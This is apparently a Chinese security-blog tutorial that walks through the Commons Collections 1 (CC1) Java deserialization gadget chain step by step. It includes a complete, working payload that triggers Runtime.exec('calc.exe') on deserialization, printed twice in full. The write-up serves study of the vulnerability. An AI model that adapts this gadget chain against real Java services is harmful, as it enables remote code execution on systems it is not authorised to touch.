# CommonsCollections1 （CC1链）

## 说明

### 前置知识

  * LazyMap：装饰另一个Map，按需在另一个Map中创建对象（懒加载）

  * Transformer：一个接口，通常用来将一个对象转化为另一个对象，被使用来做类型转换或者从对象中提取数据

  * ConstantTransformer：Transformer的实现类，将输入对象转化为Object类型

  * LazyMap.entrySet()：将LazyMap中所有的键值对看作是一个set集合

  * AnnotationInvocationHandler：实现了InvocationHandler，为注解对应的接口生成一个实现该接口的动态代理类

  * AnnotationType：这个类是用来描述某个指定注解的

    * 比如：定义一个注解![image-20220418233209253](https://image.3001.net/images/20220419/1650339094_625e2d168d173e5c64800.png!small)

    *         System.out.println(AnnotationType.getInstance(Dad.class));

    * ![image-20220418233328774](https://image.3001.net/images/20220419/1650339100_625e2d1c1368a45e2bff4.png!small)

    * Member types用来描述注解对应接口里的属性的类型

    * Member defaults用来描述注解对应接口里带有默认值的属性

  * 反序列化时不执行构造函数

  * 动态代理一个接口时，每次调用接口的方法时，都会去执行InvocationHandler的invoke方法（这个点搞了我很久，一开始一直想不明白为啥调用entrySet()时为啥会蹦去invoke() 方法）

#### 利用链

    
    
    AnnotationInvocationHandler.readObject()  
    $Proxy.entrySet()  
      AnnotationInvocationHandler.invoke()  
         LazyMap.get()  
            ChainedTransformer.transform()  
               ConstantTransformer.transform()  
               InvokerTransformer.transform()

#### 自己写的ysoserial简化后的payload

    
    
    package com.ysoserial;  
    ​  
    ​  
    ​  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.map.LazyMap;  
    import java.io.*;  
    import java.lang.reflect.*;  
    import java.util.HashMap;  
    import java.util.Map;  
    ​  
    ​  
    ​  
    public class CommonCollections1 {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {  
    ​  
    ​  
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class} ,new Object[]{"getRuntime",new Class[0]}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})  
        });  
        //AnnotationInvocationHandler无法直接new  
        String ANNOTATION_CLASS="sun.reflect.annotation.AnnotationInvocationHandler";  
        Constructor<?> firstConstructor = Class.forName(ANNOTATION_CLASS).getDeclaredConstructors()[0];  
        firstConstructor.setAccessible(true);  
        Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);  
    ​  
    ​  
    ​  
        Map mapProxy = (Map) Proxy.newProxyInstance(  
                CommonCollections1.class.getClassLoader(),  
                new Class[]{Map.class},  
                (InvocationHandler) firstConstructor.newInstance(Override.class, lazyMap)  
        );  
    ​  
        InvocationHandler invocationHandler = (InvocationHandler) firstConstructor.newInstance(Override.class, mapProxy);  
    ​  
        //序列化  
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
        objectOutputStream.writeObject(invocationHandler);  
        byteArrayOutputStream.flush();  
        byte[] bytes = byteArrayOutputStream.toByteArray();  
    ​  
    ​  
        //反序列化  
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
        objectInputStream.readObject();  
    ​  
    ​  
    }  
    }

  

## 分析正文

分析反序列化按三个点来找，第一个就是source，反序列化入口点，就是AnnotationInvocationHandler的readObject()，后面我们要封装这个AnnotationInvocationHandler来触发反序列化漏洞

![image-20220418225209987](https://image.3001.net/images/20220419/1650339160_625e2d58d1574e2810e91.png!small)

AnnotationInvocationHandler类有三个属性

![image-20220418225348255](https://image.3001.net/images/20220419/1650339162_625e2d5ae7c97a72de630.png!small)

memberValues是一个Map接口，type是个注解，下面是一些比较常见的注解。

![image-20220418225746424](https://image.3001.net/images/20220419/1650339224_625e2d98e2d14fa6c1bc7.png!small)

因为memberValues是一个Map接口，Map接口里没有具体的entrySet()实现，按着利用链梳理下来，所以这里的entrySet()具体实现由代理类来完成，

 **插播一条小知识：**

这里我们讲解一下创建一个动态代理类的方法，

![image-20220418234939902](https://image.3001.net/images/20220419/1650339287_625e2dd72f979c7b85cf5.png!small)

我们可以通过Proxy.newProxyInstance()来创建动态代理类，第一个参数需要一个类加载器，第二个参数需要一个动态代理要实现的接口的Class数组，第三个参数最重要，他是一个InvocationHandler接口，里面有个invoke方法，当我们调用动态代理类里的方法时都会直接去调用invoke方法。

举个例子：

写一个接口：

    
    
    public interface Test2 {  
    public void printA();  
    }

写一个实现类：

    
    
    public class Test3 implements Test2 {  
    public void printA(){  
        System.out.println("12312321312");  
    }  
    }

创建一个动态代理类：

    
    
    Test2 proxyTest2 = (Test2)Proxy.newProxyInstance(CommonCollections1.class.getClassLoader(), new Class[]{Test2.class}, new InvocationHandler() {  
    @Override  
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {  
        Test3 test3 = new Test3();  
        return method.invoke(test3,args);  
    }  
    });

当我们调用这个动态代理的方法时：

    
    
    proxyTest2.printA();

他会去执行当初定义动态代理类时写的invoke方法

大家可以自己去手动调试。

其实上面所讲的就是对应payload中的这个片段

    
    
    Map mapProxy = (Map) Proxy.newProxyInstance(  
                CommonCollections1.class.getClassLoader(),  
                new Class[]{Map.class},  
                (InvocationHandler) firstConstructor.newInstance(Override.class, lazyMap)  
        );

他会执行第三个参数创建的AnnotationInvocationHandler类的invoke方法

  

接下来是AnnotationInvocationHandler，他是InvocationHandler接口的具体实现类，他跟InvocationHandler的功能一样，只不过他是用于生成注解对应接口的动态代理类的。

他有个构造函数：

![1650434169_625fa079eebb328d04760.png!small?1650434170671](https://image.3001.net/images/20220420/1650434169_625fa079eebb328d04760.png!small?1650434170671)

没加访问权限修饰符，默认是default，可以根据传入的type和memberValues为对应的属性赋值

  

上面的entrySet()走到AnnotationInvocationHandler的invoke方法

查看他自己实现的invoke方法：![image-20220419001031800](https://image.3001.net/images/20220419/1650339349_625e2e15ea8a3fbbc3410.png!small)

首先是拿到传入的method的名字，传入方法名不等于equals、toString、hashCode、annotationType就会执行到memberValues.get(member)，前面说过memberValues是一个代理了Map的动态代理类，而这里执行的invoke是另一个AnnotationInvocationHandler类，这个里面的memberValues就不是Map的动态代理类啦，是我们Proxy.newProxyInstance传入的第三个参数

    
    
    Map mapProxy = (Map) Proxy.newProxyInstance(  
    CommonCollections1.class.getClassLoader(),  
    new Class[]{Map.class},  
    (InvocationHandler) firstConstructor.newInstance(Override.class, lazyMap)  
    );

这个lazyMap是啥

    
    
    Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);

从payload中可以看到lazyMap其实就是包装了HashMap和transformerChain的LazyMap类型

所以上图中的memberValues.get(member)，实际就是LazyMap.get(member)，我们看LazyMap.get()

![1650434179_625fa0836d9f2896e6d63.png!small?1650434180142](https://image.3001.net/images/20220420/1650434179_625fa0836d9f2896e6d63.png!small?1650434180142)

如果map里不包含key，就进入factory.transform(key)，而这个factory实际是一个Transformer接口，可以通过构造LazyMap时指定他的factory，payload中指定他的factory为transformerChain，transformerChain是ChainTransformer类型，他实现Transformer接口

    
    
    Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);

![image-20220419003624511](https://image.3001.net/images/20220419/1650339412_625e2e54cf3886306eaca.png!small)

因为传入的是一个ChainedTransformer实现类，这时候调用的就是他里面的transform方法

![image-20220419003907123](https://image.3001.net/images/20220419/1650339473_625e2e91e452e5e01018d.png!small)

这个iTransformers是一个Transformer接口数组

![1650434199_625fa097cb8e2eeaed87b.png!small?1650434200493](https://image.3001.net/images/20220420/1650434199_625fa097cb8e2eeaed87b.png!small?1650434200493)

我们可以在new一个ChainedTransformer时指定他的iTransformers，

![image-20220419004313318](https://image.3001.net/images/20220419/1650339656_625e2f48b6da48c1fe2f9.png!small)

payload就是这样做的

    
    
    Transformer transformerChain = new ChainedTransformer(new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class} ,new Object[]{"getRuntime",new Class[0]}),  
    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),  
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})  
    });

这个iTransformers数组里要装啥捏？

实现Transformer接口的类有很多，我们只需要InvokerTransformer和ConstantTransformer

![1650434207_625fa09fbce5b9d8a5a49.png!small?1650434208511](https://image.3001.net/images/20220420/1650434207_625fa09fbce5b9d8a5a49.png!small?1650434208511)

InvokerTransformer可以根据传入的对象，用传入的对象执行指定方法，iMethodName和iParamTypes和iArgs是InvokerTransformer自带的属性，也可以在new时指定值。

![1650434213_625fa0a5e84b6486b9c16.png!small?1650434214694](https://image.3001.net/images/20220420/1650434213_625fa0a5e84b6486b9c16.png!small?1650434214694)

而这个ConstantTransformer的transform方法就是传啥还啥

![image-20220419004730981](https://image.3001.net/images/20220419/1650339781_625e2fc54df32419b1aca.png!small)

分析结束

梳理一下

首先反序列化一个AnnotationInvocationHandler类，然后执行他的readObject()方法，因为readObject()方法里有memberValues.entrySet()，memberValues是我们传入的动态代理类，因为我们指定他的InvocationHandler为AnnotationInvocationHandler类，所以他会去执行AnnotationInvocationHandler类的invoke方法，invoke方法里memberValues.get其实是LazyMap.get，而LazyMap.get又会执行ChainTransformer类的transform，在这个transform方法里依次调用iTransformers数组里每个元素的transform方法

 **序列化就是相反的步骤**

然后我们开始一步步还原序列化，首先创建一个ChainedTransformer来执行恶意代码，

    
    
    Transformer transformerChain = new ChainedTransformer(new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class} ,new Object[]{"getRuntime",new Class[0]}),  
    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),  
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})  
    });

然后将ChainedTransformer封装进LazyMap，等待LazyMap.get调用这个ChainedTransformer的transform

    
    
    Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);//创建一个LazyMap，并把包装过的transformerChain传入，第一个参数不重要，只是因为他需要一个Map对象来装饰，所以我们随便传一个

由于AnnotationInvocationHandler无法直接new

所以需要借助反射的方式获取这个类

    
    
    String ANNOTATION_CLASS="sun.reflect.annotation.AnnotationInvocationHandler";  
    Constructor<?> firstConstructor = Class.forName(ANNOTATION_CLASS).getDeclaredConstructors()[0];//拿到第一个构造器，也就是上面说的那个  
    firstConstructor.setAccessible(true);//因为他是default，所以要将他权限打开

我们创建一个Map的动态代理类，第三个参数传入包装了ChainedTransformer的LazyMap，将LazyMap当成自己的memberValues，等待执行第三个参数AnnotationInvocationHandler类的invoke方法，然后利用链传递给LazyMap.get

    
    
    Map mapProxy = (Map) Proxy.newProxyInstance(  
    CommonCollections1.class.getClassLoader(),  
    new Class[]{Map.class},  
    (InvocationHandler) firstConstructor.newInstance(Override.class, lazyMap)  
    );

创建一个要执行反序列化的对象，将动态代理对象传进去，将mapProxy当成自己的memberValues，等待执行反序列化时触发自身的readObject，然后将利用链传给mapProxy.entrySet()

    
    
    InvocationHandler invocationHandler = (InvocationHandler) firstConstructor.newInstance(Override.class, mapProxy);

完整代码：

    
    
    package com.ysoserial;  
      
      
      
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.map.LazyMap;  
    import java.io.*;  
    import java.lang.reflect.*;  
    import java.util.HashMap;  
    import java.util.Map;  
      
      
      
    public class CommonCollections1 {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {  
      
      
    Transformer transformerChain = new ChainedTransformer(new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class} ,new Object[]{"getRuntime",new Class[0]}),  
    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),  
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})  
    });  
    //AnnotationInvocationHandler无法直接new  
    String ANNOTATION_CLASS="sun.reflect.annotation.AnnotationInvocationHandler";  
    Constructor<?> firstConstructor = Class.forName(ANNOTATION_CLASS).getDeclaredConstructors()[0];  
    firstConstructor.setAccessible(true);  
    Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);  
      
      
      
    Map mapProxy = (Map) Proxy.newProxyInstance(  
    CommonCollections1.class.getClassLoader(),  
    new Class[]{Map.class},  
    (InvocationHandler) firstConstructor.newInstance(Override.class, lazyMap)  
    );  
      
    InvocationHandler invocationHandler = (InvocationHandler) firstConstructor.newInstance(Override.class, mapProxy);  
      
    //序列化  
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
    objectOutputStream.writeObject(invocationHandler);  
    byteArrayOutputStream.flush();  
    byte[] bytes = byteArrayOutputStream.toByteArray();  
      
      
    //反序列化  
    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
    ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
    objectInputStream.readObject();  
      
      
    }  
    }

执行召唤出神兽

![1650338937_625e2c79d1df45c2a7f63.png!small?1650338938873](https://image.3001.net/images/20220419/1650338937_625e2c79d1df45c2a7f63.png!small?1650338938873)

